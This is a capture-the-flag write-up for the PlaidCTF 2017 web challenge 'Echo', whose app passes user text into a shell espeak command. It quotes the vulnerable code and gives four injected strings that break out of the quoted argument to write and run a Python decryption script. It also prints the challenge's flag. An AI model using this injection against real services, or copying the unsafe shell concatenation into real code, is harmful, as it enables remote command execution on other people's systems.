# PlaidCTF 2017 - Echo

| Category | Points | Solves |
| -------- |--------| -------|
| Web      | 200    | 300    |

> If you hear enough, you may hear the whispers of a key... 
> If you see [app.py](echo_57f0dd57961caae2fd8b3c080f0e125b.py) well enough, you will notice the UI sucks... 
> 
> http://echo.chal.pwning.xxx:9977/
>
> http://echo2.chal.pwning.xxx:9977/

## Solution

We are given with an application that converts strings into audio using a Docker container which is [publicly available](https://hub.docker.com/r/lumjjb/echo_container/):

```python
    docker_cmd = "docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"

    tweets = []
    for i in range(4):
        t = request.args.get('tweet_' + str(i+1))
        tweets.append(t)

    my_path = "/tmp/echo/" + uuid.uuid4().hex + "/"

    # strings are saved on /tmp/echo/uuid/input
    with open(my_path + "input" ,"w") as f:
        f.write('\n'.join(tweets))
   
    # encrypted flag is stored on /tmp/echo/uuid/flag
    process_flag(my_path + "flag")
    
    subprocess.call(docker_cmd.format(path=my_path).split())
```

The process_flag function takes the original flag and stores it in the input file using a reversible encryption algorithm:

```python
    with open('/tmp/echo/uuid/flag','w') as f:
        for x in flag:
            c = 0
            towrite = ''
            for i in range(65000 - 1):
                k = random.randint(0,127)
                c = c ^ k
                towrite += chr(k)

            # 64999 bytes with k states +
            # 1 byte of a flag char xored with the c state
            f.write(towrite + chr(c ^ ord(x)))
    return
```


A shared folder is being used inside the container to transfer files to and from the main application as seen on the docker_cmd spec. Following you can see the folder mappings:

| Host | Guest | Description |
| ---- | ----- | ----------- |
| /tmp/echo/uuid/ | /share/ | Share folder pointing to unique path on host |
| /tmp/echo/uuid/input | /share/input | Tweets |
| /tmp/echo/uuid/out/ | /share/out/ | Folder used to store audio files |
| /tmp/echo/uuid/flag | /share/flag | Encrypted flag from process_flag function |


The [run.py](run.py) application inside the Docker container is vulnerable to remote command execution:

```python
    with open('/share/input') as f:
        lines = f.readlines()
        i=0
        for l in lines:
            i += 1
            l = l.strip()
            call(["sh","-c", "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])
```

Now we have two options to solve the problem:

1. Get the entire flag file using the espeak command, and the automate the data extraction from the wav file.
2. Decrypt the flag file directly on the server and get it as an audio file.

I first went for the entire flag file extraction and promptly have technical issues, the process_audio function ignores audio with more than 5MB. To get one character from the file we needed to get 65k bytes and convert them into audio, with an hexadecimal codification the final audio was heavier than expected (100MB), so the function ignores the file completely.

Finally, the second option was implemented with a friend advice. The following script was used to decrypt the file:

```python
with open('/share/flag','rb') as f:
    while True:
        b = f.read(65000)
        
        if not b:
            break
        
        c=0
        for i in range(64999):
            c = c ^ ord(b[i])
        
        print hex(c ^ ord(b[64999]))[2::]
```

The four injected strings were:
```bash
";echo "with open('/share/flag','rb') as f:\n while True:\n  b = f.read(65000)\n  if not b:\n   break\n  c=0\n">/share/out/test;echo "
";echo "  for i in range(64999):\n   c = c ^ ord(b[i])\n  print hex(c ^ ord(b[64999]))[2::]\n">>/share/out/test;"
";python2 /share/out/test> /share/out/words 2>&1;echo "
";espeak -s 150 -g 50 -w /share/out/1.wav -f /share/out/words;echo "
```

You can hear the flag from the [first audio file](1.wav).

## Flag
> PCTF{L15st3n_T0__reee_reeeeee_reee_la}